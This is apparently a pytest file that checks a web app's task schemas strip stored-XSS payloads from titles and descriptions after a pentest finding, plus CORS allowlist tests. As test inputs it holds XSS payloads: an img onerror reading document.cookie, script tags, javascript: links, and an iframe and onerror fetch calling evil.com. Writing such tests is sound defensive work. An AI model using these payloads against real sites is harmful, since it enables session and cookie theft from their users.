"""Tests for XSS sanitisation on task title and description fields.

Findings addressed:
  CRIT-002 – Stored XSS + DoS via task title/description
  (pentest 2026-05-07, initiative-dev.morels.me)
"""

from app.schemas.task import TaskBase, TaskUpdate


# ---------------------------------------------------------------------------
# Title sanitisation – plain text only, all HTML stripped
# ---------------------------------------------------------------------------


def test_title_plain_text_unchanged():
    t = TaskBase(title="Fix login bug")
    assert t.title == "Fix login bug"


def test_title_img_onerror_stripped():
    """The exact payload used in the pentest."""
    payload = "<img src=x onerror=window.__xss=document.cookie>"
    t = TaskBase(title=payload)
    assert "<img" not in t.title
    assert "onerror" not in t.title


def test_title_script_tag_stripped():
    t = TaskBase(title="<script>alert(1)</script>hello")
    assert "<script>" not in t.title
    assert "hello" in t.title


def test_title_anchor_tag_stripped():
    t = TaskBase(title='<a href="javascript:alert(1)">click</a>')
    assert "<a" not in t.title
    assert "click" in t.title


def test_title_nested_html_stripped():
    t = TaskBase(title="<b><i>bold italic</i></b>")
    assert "<b>" not in t.title
    assert "bold italic" in t.title


def test_title_html_only_becomes_empty_string():
    # A title that is ONLY HTML tags reduces to "" after stripping.
    # Pydantic allows empty strings unless min_length is set;
    # the sanitiser should not crash on degenerate input.
    t = TaskBase(title="<b></b>")
    assert t.title == ""


def test_task_update_title_sanitized():
    u = TaskUpdate(title="<img src=x onerror=alert(1)> urgent fix")
    assert "<img" not in u.title
    assert "urgent fix" in u.title


# ---------------------------------------------------------------------------
# Description sanitisation – dangerous tags/attrs stripped, safe content kept
# ---------------------------------------------------------------------------


def test_description_none_unchanged():
    t = TaskBase(title="Task", description=None)
    assert t.description is None


def test_description_plain_text_unchanged():
    t = TaskBase(title="Task", description="Steps to reproduce")
    assert t.description == "Steps to reproduce"


def test_description_script_tag_stripped():
    """Exact pentest payload."""
    payload = '"><script>window.__desc_xss=1</script><b onmouseover=window.__x=1>hover</b>'
    t = TaskBase(title="Task", description=payload)
    assert "<script>" not in t.description
    assert "window.__desc_xss" not in t.description


def test_description_event_handlers_stripped():
    t = TaskBase(
        title="Task",
        description='<b onmouseover="alert(1)">text</b>',
    )
    assert "onmouseover" not in t.description
    assert "text" in t.description


def test_description_javascript_uri_blocked():
    t = TaskBase(
        title="Task",
        description='<a href="javascript:alert(1)">link</a>',
    )
    assert "javascript:" not in t.description


def test_description_iframe_stripped():
    t = TaskBase(
        title="Task",
        description='<iframe src="https://evil.com"></iframe>',
    )
    assert "<iframe" not in t.description


def test_description_onerror_attribute_stripped():
    t = TaskBase(
        title="Task",
        description='<img src=x onerror=fetch("//evil.com")>',
    )
    assert "onerror" not in t.description


def test_task_update_description_sanitized():
    u = TaskUpdate(description="<script>steal(document.cookie)</script>notes")
    assert "<script>" not in u.description
    assert "notes" in u.description


# ---------------------------------------------------------------------------
# CORS config – settings.cors_origins returns correct allowlist
# ---------------------------------------------------------------------------


def test_cors_defaults_to_app_url():
    from app.core.config import Settings

    s = Settings(
        SECRET_KEY="x",
        DATABASE_URL_APP="postgresql+asyncpg://a:b@localhost/c",
        DATABASE_URL_ADMIN="postgresql+asyncpg://a:b@localhost/c",
        APP_URL="https://app.example.com",
    )
    assert "https://app.example.com" in s.cors_origins


def test_cors_allowed_origins_string_parsed():
    from app.core.config import Settings

    s = Settings(
        SECRET_KEY="x",
        DATABASE_URL_APP="postgresql+asyncpg://a:b@localhost/c",
        DATABASE_URL_ADMIN="postgresql+asyncpg://a:b@localhost/c",
        APP_URL="https://app.example.com",
        ALLOWED_ORIGINS="https://www.example.com,https://staging.example.com",
    )
    origins = s.cors_origins
    assert "https://app.example.com" in origins
    assert "https://www.example.com" in origins
    assert "https://staging.example.com" in origins


def test_cors_wildcard_not_in_default_origins():
    from app.core.config import Settings

    s = Settings(
        SECRET_KEY="x",
        DATABASE_URL_APP="postgresql+asyncpg://a:b@localhost/c",
        DATABASE_URL_ADMIN="postgresql+asyncpg://a:b@localhost/c",
    )
    assert "*" not in s.cors_origins
